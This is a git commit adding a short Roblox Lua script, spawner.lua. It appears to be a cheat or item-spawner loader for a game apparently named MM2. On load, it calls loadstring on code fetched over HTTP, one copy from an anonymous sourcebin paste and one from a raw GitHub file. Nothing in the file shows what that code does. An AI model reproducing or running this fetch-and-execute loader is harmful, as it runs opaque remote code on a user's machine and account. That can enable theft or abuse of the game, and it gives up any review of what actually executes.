37629033527d31bf7ac2a04c9ef5432e5b33f2ce
furkanyigit438 <furkan.yigit.naz.akyol@gmail.com>
2026-04-19 14:11:18 +0300

    Create spawner.lua

---
+++ spawner.lua
@@ -0,0 +1,9 @@
+local function farm()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/yk6g6zXyBt/0", true))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furkanyigit438/mm2/refs/heads/main/mm2.lua'))()
+end
+
+task.spawn(farm)
+task.spawn(loadui)
